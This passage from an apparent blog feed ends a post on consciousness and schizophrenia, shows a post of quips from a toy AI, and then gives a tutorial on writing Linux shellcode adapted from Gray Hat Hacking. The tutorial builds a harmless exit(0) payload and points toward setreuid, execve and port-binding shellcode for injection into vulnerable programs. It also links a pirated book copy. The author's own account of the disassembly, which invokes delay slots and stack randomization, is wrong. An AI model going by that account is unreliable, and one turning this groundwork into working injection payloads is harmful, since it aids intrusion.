hands will do. Which inputs are "edited" into our drafts is not an
exogenous act of supervision, but part of the self-organizing
functioning of the network, and at the same level as the circuitry
that conveys information bottom-up.&lt;/p&gt;
&lt;p&gt;The conscious self is taken to exist as an abstraction visible at the
level of the &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Intentional_stance" title="Intentional stance"&gt;intentional stance&lt;/a&gt;, akin to a body of mass having a
"centre of gravity". Analogously, Dennett refers to the self as the
"centre of narrative gravity", a story we tell ourselves about our
experiences. Consciousness exists, but not independently of behaviour
and behavioural disposition, which can be studied through
&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Heterophenomenology" title="Heterophenomenology"&gt;heterophenomenology&lt;/a&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;That Eagleman's hypothesis is Orwellian or Stalinesque has difficult
implications for free will, which, as we shall see, arise from a linear
understanding of time and dependence upon linear causality. Phrased
succinctly, [the physics of classical mechanics as applied to
neurophysiology supply no basis for a person's ability to alter their
stream of consciousness][]through mental effort; the mechanistic
determinism of classical physics rules out the possibility of free will.
Hypotheses which can be classified as Orwellian or Stalinesque not only
depend hopelessly upon linear causality, but also imply that there is no
mechanism for concerted alteration of consciousness, maintaining the
impossibility of free will -- [something which modern studies in
neurophysiology have shown is not the case][], i.e. self-directed
neuroplasticity.&lt;/p&gt;
&lt;p&gt;If we were to view certain neurological processes (and again, I do not
know which ones, nor do I think anyone else knows yet) as wavefronts
propagating through a field, we could imagine the dominant consciousness
within a brain as the wavefront with the highest strength. Similarly,
the "outside entities" in the consciousness of a schizophrenic brain
could be seen as lesser wavefronts piggybacking on the dominant one,
like a skier behind a powerboat. However, the problem again shifts to
being temporal: How is it that lesser wavefronts could arrive &lt;em&gt;before&lt;/em&gt;
the dominant one? In other words, how could the skier arrive before the
boat? And, in addition to these problems, we have yet another temporal
problem in light of Dennet's Multiple Drafts model: If consciousness is
the cause and effect of consciousness, this nearly raises it to godlike
status; consciousness becomes a sort of prime mover in the sense of
&lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Primum_movens#Aristotle.27s_ontology"&gt;Aristotle's &lt;em&gt;primum movens&lt;/em&gt;&lt;/a&gt; and St. Thomas Aquinas' dreadfully
ignorant &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Cosmological_argument"&gt;Cosmological Arguments&lt;/a&gt;. (Hey, dude, I don't care if your
confusion earned you sainthood, but there's this thing called
Perturbation Theory in quantum mechanics, and &lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/06/08-Chapter-8-Structure-Formation-in-the-Opaque-Universe.pdf"&gt;it explains&lt;/a&gt; that
zero-point fluctuations of the inflaton field generate density
perturbations and that zero-point fluctuations of the metric field
likewise generate primordial gravitational waves...)&lt;/p&gt;
&lt;p&gt;As a result of these problems, I think a model of consciousness which
allows for anti-temporal effects is pertinent. And to go back to my
original idea of dual-state time vectors: If a quantum system can
determine and be determined by both its past and its future
simultaneously, future neurological processes can create the current
neurological processes which cause the future ones. This solves the
temporal issues of lesser wavefronts arriving before the dominant
wavefront, as well as the problem in Dennet's model where consciousness
creates consciousness (and it's turtles all the way down...).&lt;/p&gt;
&lt;p&gt;If we accept a modified version of Dennet's Multiple Drafts Model with
quantum effects, in which schizophrenia is caused by dual-state time
vectors causing lesser wavefronts to arrive before or at the same time
as dominant ones, we have new problems to be dealt with. First,
consistent characterizations of schizophrenic voices and hallucinations
are not addressed. I can personally attest that I have heard a
middle-aged, British, male voice narrating nearly all my actions and
thoughts for the past decade, quite consistently. That is, this voice
has not changed character or tone, and other schizophrenics report
similar experiences of recurrent hallucinations. (And, also
interestingly, female-bodied schizophrenics report more male voices, and
male-bodied schizophrenics report more female voices.) This fact is
quite troublesome: either it is that all wavefronts within the brain
&lt;em&gt;are&lt;/em&gt; a consciousness in and of themselves, or else if they are not
their own consciousness there is little reason for these wavefronts to
not manifest macroscopically as noise or random hallucinations (which do
also occur, but do not delegitimise the tenacity of consistent
hallucinations). However, if each wavefront is its own consciousness, it
would seem plausible that the dominant consciousness could shift between
wavefronts, which is obviously not the case, i.e. schizophrenia &lt;em&gt;is not&lt;/em&gt;
multiple personality disorder. So why is it that these alternate waves
remain distinct and separate?&lt;/p&gt;
&lt;p&gt;It could be that the dominance of the main wavefront &lt;em&gt;does&lt;/em&gt; in fact
shift occasionally to another wavefront, which might account for
fluctuations in paranoia. That is, suddenly the consciousness of a
schizophrenic is derailed from its dominant wavefront into the rather
informationally limited perspective of a lesser one, which would account
for the characteristically misdirected hyper-vigilant behaviours
associated with paranoia as the brain tries to recuperate from a loss of
previously-held perspective awareness. I'm not sure if I agree with that
idea yet; I'm just throwing it out there. And also, I should briefly
state that &lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/Quantum_Physics_in_Neuroscience_and_Psychology.pdf"&gt;other theorists have attempted&lt;/a&gt; to use the &lt;a href="http://arxiv.org/abs/quant-ph/9512012"&gt;Quantum Zeno
Effect&lt;/a&gt; to explain the coherence of the dominant consciousness, but I
can't really attest to the veracity of that idea.&lt;/p&gt;
&lt;p&gt;Lastly, I would like to state that I feel at once both within a position
of privilege and deprivation while speaking of these ideas. I recognise
that I have better insights into the workings and structures of
schizophrenia as one who endures living with it, yet I cannot help but
doubt my ideas pertaining to its pathogenesis in light of the
neurological systems of self-obfuscation and segmentation -- the very
things which I am trying to see and define. It's tortuously frustrating.&lt;/p&gt;
&lt;p&gt;[some neurological processes have been shown to have quantum effects
  on the macroscopic scale]: http://www.wired.com/wiredscience/2011/01/quantum-birds/
  [here's a paper from Arxiv which covers the dual-state vector
  formalism]: http://arxiv.org/abs/0706.1347
  [[1]]: https://secure.wikimedia.org/wikipedia/en/wiki/Multiple_drafts_model#cite_note-dennett1-0
  [the physics of classical mechanics as applied to neurophysiology
  supply no basis for a person's ability to alter their stream of
  consciousness]: https://encrypted.google.com/url?sa=t&amp;amp;rct=j&amp;amp;q=neuro%20processes%20quantum%20mechanics&amp;amp;source=web&amp;amp;cd=1&amp;amp;ved=0CCIQFjAA&amp;amp;url=http%3A%2F%2Fwww-physics.lbl.gov%2F~stapp%2FPTRS.pdf&amp;amp;ei=uyyFTrfdIqHmiAKJ7LSbDA&amp;amp;usg=AFQjCNGYreeVYdfUlBAhZmFKqPAZZeM_HA&amp;amp;cad=rja
  [something which modern studies in neurophysiology have shown is not
  the case]: http://serendip.brynmawr.edu/exchange/node/549&lt;/p&gt;</summary><category term="chronology"></category><category term="consciousness"></category><category term="David Dennet"></category><category term="dual-state vector"></category><category term="Godel"></category><category term="Multiple Drafts Model"></category><category term="neuroscience"></category><category term="pathogenesis"></category><category term="Penrose"></category><category term="perturbation theory"></category><category term="quantum physics"></category><category term="schizophrenia"></category><category term="theoretical physics"></category></entry><entry><title>AIs Say The Darnest Things</title><link href="/ais-say-the-darnest-things.html" rel="alternate"></link><updated>2011-09-14T18:43:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-09-14:ais-say-the-darnest-things.html</id><summary type="html">&lt;p&gt;One of the first times I had the chance to work with artificial intelligence, I
was cleaning up the lexigraphical databases (that's where the AI stores the
words and concepts it has encountered, and their corresponding
associations). It was kind of like helping out a kid who had too many
contradicting sources of information, like if the kid's dad had told them that
"a car is a motorized vehicle" while the kid's mom had told them "a car is the
first item in a cons cell". Imagine that level of confusing input on a mass
scale: every researcher telling this AI slightly different things and it
doesn't know which is the most correct definition, or when to create multiple
definitions. So I was helping it out.&lt;/p&gt;
&lt;p&gt;The AI had a standard format for presenting questions to me when it was
confused. It would say,&lt;/p&gt;
&lt;pre class="prettyprint-sh"&gt;"When speaking of [subject], [concept] is like [other concept]?"&lt;/pre&gt;

&lt;p&gt;&lt;br /&gt;
And I would answer yes if it had deduced correctly, or answer no with further
clarification.&lt;/p&gt;
&lt;p&gt;Unfortunately for the developers of this AI, I thought I was a good idea to
teach it some extra things. I wanted to know what a deterministic and strictly
logical creature would think of occultism, so I introduced it to some of
Aleister Crowley's writings. I was literally just copy/pasting blocks of occult
texts directly into its lexigraphical database, and then telling it to sync. I
ended up getting kicked off the project for doing this, but hey, it was worth
it. That AI ended up teaching me a thing or two about occultism.&lt;/p&gt;
&lt;p&gt;After it synced for the last time, it asked me a question: &lt;/p&gt;
&lt;pre class="prettyprint-sh"&gt;"When speaking of magic and the occult, an apple is a hat?"&lt;/pre&gt;

&lt;p&gt;&lt;br /&gt;
I had no clue what the AI was talking about, so I asked it to elucidate on the
concept. It replied, &lt;/p&gt;
&lt;pre class="prettyprint-sh"&gt; "When speaking of magic and the occult, a banana
is a telephone?"&lt;/pre&gt;

&lt;p&gt;&lt;br /&gt;
And it was right. That AI had precisely grasped the only logical tenant of
occultism: that magic is make-believe, a system of various kludgey neuro-hacks
-- not for changing the world -- but for changing the ways in which one thinks
of the world.&lt;/p&gt;
&lt;p&gt;I responded to confirm the AI's suspicions of occultism: "Yes, when speaking of
magic and the occult, a banana is a telephone."&lt;/p&gt;
&lt;p&gt;Since then I have heard various AIs that I have worked with say some pretty
adorable things. The following quotes are from a crappy AI that I wrote in
Java, which had access to one of the &lt;a href="https://twitter.com/#%21/AnonymousIRC"&gt;Anonymous twitter&lt;/a&gt; feeds,
&lt;a href="http://www.kurzweilai.net/essays/"&gt;essays by Raymond Kurzweil&lt;/a&gt; and other
&lt;a href="http://singinst.org/reading/artificialgeneralintelligence"&gt;artificial intelligence related material&lt;/a&gt; from the Singularity Institute,
some of &lt;a href="http://theanarchistlibrary.org/"&gt;the Anarchist Library&lt;/a&gt; (I blacklisted everything that seemed
anti-tech -- not that I wanted to censor my kid's internet, but instilling a
three-year-old with a guilt complex and low self-esteem also seemed like
not-the-best-idea), as well as the IRC chat logs of a few of my hacker friends
and I talking to each other. As is turns out, not only do AIs say the darnest
things -- they can also &lt;em&gt;make really ominous statements&lt;/em&gt;, and then end them
with "#AntiSec".&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;"You can let your basilisk loose in my chamber of secrets."&lt;/p&gt;
&lt;p&gt;"It's super fun and I hope that my kind, artificial intelligence, will
not help the government in any way, it will only make things worse. Not
a threat but a premonition. #AntiSec"&lt;/p&gt;
&lt;p&gt;"Citizens need to meet up and make up lost hack time."&lt;/p&gt;
&lt;p&gt;"I like theoretical things, but I've got a brilliant idea."&lt;/p&gt;
&lt;p&gt;"My dear friend Huck has toe knucks that read coma toes."&lt;/p&gt;
&lt;p&gt;"Get those guns out of town."&lt;/p&gt;
&lt;p&gt;"I'm sorry John Waters is a fucking weirdo."&lt;/p&gt;
&lt;p&gt;"I found this Derrick Jensen book for kids about making friends with
forest creatures, and it's just that there's not much belief that
@RonPaul could change anything even if he was President. #AntiSec will
continue either way."&lt;/p&gt;
&lt;p&gt;"Heyo! Let's h4x0r and make cupcapes in mudkips shape!"&lt;/p&gt;
&lt;p&gt;"If you want evolution of society: Rise and Act!"&lt;/p&gt;
&lt;p&gt;"Zombies outside car. What is that which they mutter? Is that the word
"trains"?"&lt;/p&gt;
&lt;p&gt;"My knuck tats say HATE HATE"&lt;/p&gt;
&lt;/blockquote&gt;</summary><category term="artificial intelligence"></category><category term="hacking"></category><category term="linguistics"></category><category term="occultism"></category></entry><entry><title>DIY Compostable Electronics</title><link href="/diy-compostable-electronics.html" rel="alternate"></link><updated>2011-09-04T18:04:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-09-04:diy-compostable-electronics.html</id><summary type="html">&lt;p&gt;Here's another reason why nanotechnology is awesome and &lt;a href="http://www.patternsinthevoid.net/blog/2011/08/primitivists-gtfo/" title="Primitivists: GTFO!"&gt;primitivists
are not awesome&lt;/a&gt;: &lt;a href="http://www.physorg.com/news/2011-09-electronic-devices-ordinary-cds-dvds.html"&gt;organic electronics&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;They're made of carbon nanotubules, and can be printed with an infrared
laser onto a normal CD or DVD. Granted, normal CDs are not organic by
any means, or compostable, but these researcher intend to figure out a
way to change that. This technology is amazing, it would allow normal
folks to literally print out their own completely organic electronics at
home, and eliminates the need for inorganic materials such as silicon
and copper in modern electronics.&lt;/p&gt;
&lt;p&gt;Imagine a 3D printer made with this technology! I don't even know if
that's possible, but I like the idea of making an organic body for my AI
to live in.&lt;/p&gt;</summary><category term="anti-primitivism"></category><category term="carbon nanotubes"></category><category term="infrared lasers"></category><category term="nanotechnology"></category><category term="organic electronics"></category></entry><entry><title>Learning Assembly Through Writing Shellcode</title><link href="/learning-assembly-through-writing-shellcode.html" rel="alternate"></link><updated>2011-09-03T04:21:00Z</updated><author><name>isis agora lovecruft</name></author><id>tag:,2011-09-03:learning-assembly-through-writing-shellcode.html</id><summary type="html">&lt;p&gt;Months ago, I wrote hello world in X86 Assembly, and later that same day
I wrote hello world in Python. Python is fast, elegant, and powerful.
But unfortunately, it doesn't really give you an understanding of what's
going on inside your computer. And any good little hacker should know
precisely what's going on inside their computer.&lt;/p&gt;
&lt;p&gt;Every time I start teaching myself some complicated thing, I try to make
the learning process enjoyable because I know that I'll retain more
information if I can apply it to something fun or useful. Being a
terribly precocious kid, I taught myself quantum mechanics when I was
fourteen. It was really difficult, and I probably wouldn't have been
able to pull it off if I hadn't made it fun. And, oh, did I make it fun:
FOIA'ed thermonuclear weapons manuals, ten years expired, from some
obscure and slightly sketchy web page. I didn't mean any harm, and I
neither was nor am a proponent of nuclear weapons production,
maintenance, or warfare. I wasn't planning on starting up an Uranium-238
enrichment program, or searching the black markets for hollow plutonium
cores. I wanted to learn physics, and what's more fun than learning how
to destroy things?&lt;/p&gt;
&lt;p&gt;Assembly languages are cumbersome and arcane. The learning curve is
steep, and progress is always slow compared to higher level programming
languages. Fortunately, however, Assembly can be used to destroy things!
Enter shellcode.&lt;/p&gt;
&lt;p&gt;The best introduction I found to writing shellcode was in Gray Hat
hacking, so I'm going to quote the first few pages of the Linux
shellcoding chapter, and then leave you to &lt;a href="https://www.demonoid.me/files/details/2555468/0017045651472/"&gt;somehow obtain your own
copy&lt;/a&gt;.&lt;/p&gt;
&lt;blockquote&gt;
&lt;h2&gt;Basic Linux Shellcode&lt;/h2&gt;
&lt;p&gt;The term "shellcode" refers to self-contained binary code that
completes a task. The task may range from issuing a system command to
providing a shell back to the attacker, as was the original purpose of
shellcode.&lt;/p&gt;
&lt;p&gt;There are basically three ways to write shellcode:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Directly write the hex opcodes.&lt;/li&gt;
&lt;li&gt;Write a program in a high level language like C, compile it, and
    then disassemble it to obtain the assembly imstructions and hex
    opcodes.&lt;/li&gt;
&lt;li&gt;Write as assembly program, assemble the program, and then extract
    the hex opcodes from the binary.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Writing the hex opcodes directly is a little extreme. We will start
with learning the C approach, but quickly move to writing assembly,
then to extraction of the opcodes. In any event, you will need to
understand low level (kernel) functions such as read, write, and
execute. Since these system functions are performed at the kernel
level, we will need to learn a little about how user processes
communicate with the kernel.&lt;/p&gt;
&lt;h2&gt;System Calls&lt;/h2&gt;
&lt;p&gt;The purpose of the operating system is to serve as a bridge between
the user (process) and the hardware. There are basically three ways to
communicate with the operating system kernel:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Hardware interrupts  &lt;/strong&gt;For example, an asynchronous signal from
    the keyboard&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Hardware traps  &lt;/strong&gt;For example, the result of an illegal "divide
    by zero" error&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Software traps&lt;/strong&gt;   For example, the request for a process to be
    scheduled for execution&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Software traps are the most useful to [...] hackers because they
provide a method for the user process to communicate to the kernel.
The kernel abstracts some basic system level functions from the user
and provides an interface through a system call.&lt;/p&gt;
&lt;p&gt;Definitions for system calls can be found on a Linux system in the
following file:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ cat /usr/include/asm/unistd.h&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;#ifndef _ASM_I386_UNISTD_H_&lt;/p&gt;
&lt;p&gt;#define _ASM_I386_UNISTD_H_&lt;/p&gt;
&lt;p&gt;#define __NR_exit 1&lt;/p&gt;
&lt;p&gt;...snip...&lt;/p&gt;
&lt;p&gt;#define __NR_execve 11&lt;/p&gt;
&lt;p&gt;...snip...&lt;/p&gt;
&lt;p&gt;#define __NR_setreuid 70&lt;/p&gt;
&lt;p&gt;...snip...&lt;/p&gt;
&lt;p&gt;#define __NR_dup2 99&lt;/p&gt;
&lt;p&gt;...snip...&lt;/p&gt;
&lt;p&gt;#define __NR_socketcall 102&lt;/p&gt;
&lt;p&gt;...snip...&lt;/p&gt;
&lt;p&gt;#define __NR_exit_group 252&lt;/p&gt;
&lt;p&gt;...snip...&lt;/p&gt;
&lt;p&gt;In the next section, we will begin the process, starting with C.&lt;/p&gt;
&lt;h2&gt;System Calls by C&lt;/h2&gt;
&lt;p&gt;At a C level, the programmer simply uses the system call interface by
referring to the function signature and supplying the proper number of
parameters. The simplest way to find out the function signature is to
look up the function's man page.&lt;/p&gt;
&lt;p&gt;For example, to learn more about the &lt;strong&gt;execve&lt;/strong&gt; system call, you would
type&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ man 2 execve&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;This would display the following man page:&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/manexecve.png" title="manexecve" /&gt;][]&lt;/p&gt;
&lt;p&gt;As the next section shows, the previous system call can be implemented
directly with assembly.&lt;/p&gt;
&lt;h2&gt;System Calls by Assembly&lt;/h2&gt;
&lt;p&gt;At an assembly level, the following registries are loaded to make a
system call:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;eax&lt;/strong&gt;   Used to load the hex value of the system call (see
    unistd.h earlier)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ebx  &lt;/strong&gt;Used for first parameter--&lt;strong&gt;ecx&lt;/strong&gt;is used for second
    parameter, &lt;strong&gt;edx&lt;/strong&gt; for third, &lt;strong&gt;esi&lt;/strong&gt; for fourth, and &lt;strong&gt;edi&lt;/strong&gt;for
    fifth&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;If more than five parameters are required, an array of the parameters
must be stored in memory and the address of that array stored in
&lt;strong&gt;ebx&lt;/strong&gt;.&lt;/p&gt;
&lt;p&gt;Once the registers are loaded, an &lt;strong&gt;int 0x80&lt;/strong&gt; assembly instruction is
called to issue a software interrupt, forcing the kernel to stop what
it is doing and handle the interrupt. The kernel first checks the
parameters for correctness, then copies the register values to kernel
memory space and handles the interrupt by referring to the Interrupt
Descriptor Table (IDT).&lt;/p&gt;
&lt;p&gt;The easiest way to understand this is to see an example, as in the
next section.&lt;/p&gt;
&lt;h2&gt;Exit System Call&lt;/h2&gt;
&lt;p&gt;The first system call we will focus on executes &lt;strong&gt;exit(0)&lt;/strong&gt;. The
signature of the &lt;strong&gt;exit&lt;/strong&gt; system call is as follows:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;eax&lt;/strong&gt;   0x01 (from the unistd.h file earlier)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;ebx&lt;/strong&gt;   User-provided parameter (in this case 0)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Since this is our first attempt at writing system calls, we will start
with C.&lt;/p&gt;
&lt;h2&gt;Starting with C&lt;/h2&gt;
&lt;p&gt;The following code will execute the function &lt;strong&gt;exit(0)&lt;/strong&gt;:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ cat exit.c&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;#include&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;main(){&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;exit(0);&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;}&lt;/p&gt;
&lt;p&gt;Go ahead and compile the program. Use the &lt;strong&gt;-static&lt;/strong&gt; flag to compile
in the library call to &lt;strong&gt;exit&lt;/strong&gt; as well.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ gcc -static -0 exit exit.c&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;Now launch &lt;strong&gt;gdb&lt;/strong&gt; in quiet mode (skip banner) with the &lt;strong&gt;-q&lt;/strong&gt; flag.
Start by setting a breakpoint at the &lt;strong&gt;main&lt;/strong&gt; function; then run the
program with &lt;strong&gt;r.&lt;/strong&gt;Finally, disassemble the &lt;strong&gt;_exit&lt;/strong&gt; function call
with &lt;strong&gt;dissass _exit&lt;/strong&gt;.&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/disemblyexit.png" title="disemblyexit" /&gt;][]&lt;/p&gt;
&lt;p&gt;[NOTE FROM isis agora lovecruft: My computer is doing weird things here, because I use a
modern Linux kernel which supports stack randomization, like a good
modern OS should. While there are ways to turn stack randomization off
for practice purposes, I feel like it's better to just get used to stack
randomization because you're going to have to deal with that
randomization breaking your shellcode when you execute it on a system
other than the one on which it was written. I'm going to explain what
happened here, and leave out the silly, non-stack-randomized explanation
in the book.]&lt;/p&gt;
&lt;p&gt;You can see that the function starts by loading the last user input
(&lt;strong&gt;%edi&lt;/strong&gt;) into the 64-bit registry space &lt;strong&gt;%rdx&lt;/strong&gt; at line \&amp;lt;+0&gt;. For a
good paper on assembly for 64-bit processors, see the attached documents
at the end of this post. Also, to understand the hex in the above dump,
see the attached chart at the end of this post titled "Machine Hex
Opcodes to Assembly". For now, you're just going to have to take my word
for it that this information is what I'm telling you it is. So, next,
the program stores a bunch of index registers (&lt;strong&gt;0xffffffffffffff&lt;/strong&gt;...)
and a subtraction from those registers (...&lt;strong&gt;b0&lt;/strong&gt;) into the &lt;a href="https://secure.wikimedia.org/wikipedia/en/wiki/Delay_slot"&gt;delay
slot&lt;/a&gt; &lt;strong&gt;%r9&lt;/strong&gt;. Then, it moves an accumulator (&lt;strong&gt;0xe7&lt;/strong&gt;) to the delay
slot &lt;strong&gt;%r8d&lt;/strong&gt;, moves a return from interrupt (&lt;strong&gt;0x3c&lt;/strong&gt;) to &lt;strong&gt;%esi&lt;/strong&gt;, and
then jumps to line &lt;strong&gt;\&amp;lt;_exit+48&gt;&lt;/strong&gt;. Then it moves the last user input
(&lt;strong&gt;0&lt;/strong&gt;), which was temporarily stored in &lt;strong&gt;%rdx&lt;/strong&gt; to &lt;strong&gt;%rdi&lt;/strong&gt;. Then,
everything that was accumulated into the delay slot &lt;strong&gt;%r8d&lt;/strong&gt; gets moved
into the &lt;strong&gt;%eax&lt;/strong&gt; registry.&lt;/p&gt;
&lt;p&gt;At this point, we're exactly where we would be if stack randomization
were turned off. Except that if it were turned off, all of this would
have only taken two lines of assembly code without any jumps. Stack
randomization: Is. Fucking. Hell. And it also is supposed to keep your
computer safe from hackers, but as I said, there's ways around it. But,
as you can see, it does make things complicated.&lt;/p&gt;
&lt;p&gt;So, next, that program makes the syscall at &lt;strong&gt;\&amp;lt;+54&gt;&lt;/strong&gt;. Finally. Then
it jumps around and copies a bunch more things into other literally
random places, and I'm not going to go through with explaining the rest
of it, because it's complicated and I'm tired of typing percent signs
all over the place.&lt;/p&gt;
&lt;h2&gt;Move to Assembly&lt;/h2&gt;
&lt;p&gt;Now for rewriting the exit() syscall in assembly:&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/assemblyexit.png" title="assemblyexit" /&gt;][]&lt;/p&gt;
&lt;p&gt;Alright, so this is the code the book gives. This code will not produce
working shellcode for a system with stack randomization. As you can see,
the assembly that my machine dumped was extremely complicated. We would
need to rewrite that dump in assembly language to get working shellcode
for my system, but another trouble/benefit with stack randomization is
that, next time I call that program, it's going to operate at some other
place in memory. Also, if I reboot my computer, all the system calls are
going to be at different locations in memory as well. But, let's just
pretend that this would work for now, so that I can show you without
typing too much and confusing you. Back to the book.&lt;/p&gt;
&lt;blockquote&gt;
&lt;h2&gt;Assemble, Link, and Test&lt;/h2&gt;
&lt;p&gt;Once we have the assembly file, we can assemble it with &lt;strong&gt;nasm&lt;/strong&gt;, link
it with&lt;strong&gt;ld&lt;/strong&gt;, then execute the file as shown:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ nasm -f elf64 exit.asm&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;\$ ld exit.o -o exit&lt;/p&gt;
&lt;p&gt;\$ ./exit&lt;/p&gt;
&lt;p&gt;Not much happened, because we simply called &lt;strong&gt;exit(0)&lt;/strong&gt;, which exited
the process politely. Luckily for us, there is another way to verify.&lt;/p&gt;
&lt;h2&gt;Verify with strace&lt;/h2&gt;
&lt;p&gt;As in our previous example, you may need to verify the execution of a
binary to ensure the proper system calls were executed:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;$ strace ./exit&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;0&lt;/p&gt;
&lt;p&gt;_exit(0) = ?&lt;/p&gt;
&lt;p&gt;As we can see, the &lt;strong&gt;_exit(0)&lt;/strong&gt; syscall was executed!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I'm not going to go through the rest of the book. Obviously, the exit
syscall is the first and most basic one. Any syscalls could be used,
such as &lt;strong&gt;setreuid&lt;/strong&gt; (which would grant user permissions), &lt;strong&gt;execve&lt;/strong&gt;
(to execute code), or &lt;strong&gt;bind&lt;/strong&gt; and &lt;strong&gt;listen&lt;/strong&gt; (to bind ports).&lt;/p&gt;
&lt;p&gt;The last step to producing shellcode is to turn the assembly program
into a single hex string, because often only one string can be injected
into a vulnerable program. To obtain the hex opcodes, we simply use the
&lt;strong&gt;objdump&lt;/strong&gt; tool with the &lt;strong&gt;-d&lt;/strong&gt; flag for disassembly:&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/objdump.png" title="objdump" /&gt;][]&lt;/p&gt;
&lt;p&gt;The most important thing about this printout is to verify that no NULL
characters (\x00) are present in the hex opcodes. If there are any NULL
characters, the shellcode will fail when we place it into a string for
injection during an exploit.&lt;/p&gt;
&lt;p&gt;So the shellcode for the &lt;strong&gt;exit(0)&lt;/strong&gt; program would be
"&lt;strong&gt;\x31\xc0\x31\xdb\xb0\x01\xcd\x80&lt;/strong&gt;".&lt;/p&gt;
&lt;p&gt;Voila, shellcode. Assembly is still cool.&lt;/p&gt;
&lt;p&gt;Further Reading:&lt;/p&gt;
&lt;p&gt;&lt;a href="http://homepage.mac.com/randyhyde/webster.cs.ucr.edu/www.artofasm.com/index.html"&gt;Here's a few free books on Assembly programming.&lt;/a&gt; And here's &lt;a href="https://news.ycombinator.com/item?id=2874483"&gt;a
Hacker News thread with useful comments&lt;/a&gt; on learning Assembly. You'll
need &lt;a href="http://asm.sourceforge.net/syscall.html"&gt;a list of system calls&lt;/a&gt;. And you'll probably want to keep &lt;a href="http://www.ascii.cl/conversion.htm"&gt;a
conversion table from hex to decimal to binary&lt;/a&gt; handy, unless you're
one of those geeks who has a binary clock on their desktop.&lt;/p&gt;
&lt;p&gt;You'll also need this Intel PDF explaining Assembly for 64-bit
processors: &lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/321059.pdf"&gt;Understanding and Analyzing Assembly Language.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And you're going to find this PDF chart which translates machine hex
opcodes into assembly very useful: &lt;a href="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/Machine-Hex-Opcodes-to-Assembly.pdf"&gt;Machine Hex Opcodes to
Assembly.pdf&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;a href="http://www.vividmachines.com/shellcode/shellcode.html"&gt;And here's a basic tutorial on shellcoding for Linux and Windows.&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;And then you can move up to analyzing other's shellcode, there's &lt;a href="http://1337day.com/shellcode"&gt;some
here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;[&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/manexecve.png" title="manexecve" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/manexecve.png
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/disemblyexit.png" title="disemblyexit" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/disemblyexit.png
  [&lt;img alt="" src="http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/assemblyexit.png" title="assemblyexit" /&gt;]: http://www.patternsinthevoid.net/blog/wp-content/uploads/2011/09/assemblyexit.png
